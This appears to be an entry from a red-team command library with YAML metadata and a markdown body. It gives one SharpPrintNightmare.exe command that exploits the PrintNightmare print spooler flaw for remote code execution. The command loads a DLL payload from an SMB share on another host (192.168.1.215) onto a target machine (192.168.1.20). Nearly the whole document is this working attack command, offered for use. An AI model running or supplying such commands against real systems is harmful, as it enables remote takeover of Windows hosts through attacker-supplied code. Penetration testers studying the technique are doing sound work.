---
id: 4cfa5249-6da8-40d4-8e39-b1b3cdc9ef41
name: RCE using existing context using SharpPrintNightmare.exe
type: command
executor: bash
data: SharpPrintNightmare.exe '\\192.168.1.215\smb\addCube.dll' 'C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_addb31f9bff9e936\Amd64\UNIDRV.DLL'
  '\\192.168.1.20'
output: null
created_at: '2023-04-06T03:56:02.971315+00:00'
updated_at: '2023-04-10T20:26:14.546143+00:00'
---

# RCE using existing context using SharpPrintNightmare.exe

```bash
SharpPrintNightmare.exe '\\192.168.1.215\smb\addCube.dll' 'C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_addb31f9bff9e936\Amd64\UNIDRV.DLL' '\\192.168.1.20'
```
